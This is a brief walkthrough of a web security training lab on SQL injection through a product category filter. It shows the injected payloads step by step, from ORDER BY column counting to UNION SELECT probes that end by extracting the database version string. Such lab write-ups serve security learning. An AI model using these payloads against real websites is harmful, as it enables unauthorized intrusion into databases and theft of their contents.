# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

- sqli: product category fillter
- end goal: display the database version string

### Analysis
- url: `https://0aa7000303145d35806b800c00550044.web-security-academy.net/`

- front-end: `filter?category=Lifestyle`
- back-end: 
```sql
select * from product where category = 'Lifestyle' and released = 1
```

- determine how many columns are there 
- front-end: `filter?category=Lifestyle' order by 2#`
- back-end: 
```sql
select * from product where category = 'Lifestyle'' order by 2# and released = 1
'-- 200 OK: contain 2 columns 
```

- determine data type of columns  
- front-end: `filter?category=Lifestyle' union select 'a', 'a'#`
- back-end: 
```sql
select * from product where category = 'Lifestyle'' union select 'a', 'a'# and released = 1
'-- 200 OK: both columns are text 
```

- display database version
- front-end: `filter?category=Lifestyle' union select @@version, null#`
- back-end: 
```sql
select * from product where category = 'Lifestyle'' union select @@version, null# and released = 1
'-- microsoft: 200 OK 
```
- Congratulations, you solved the lab!

---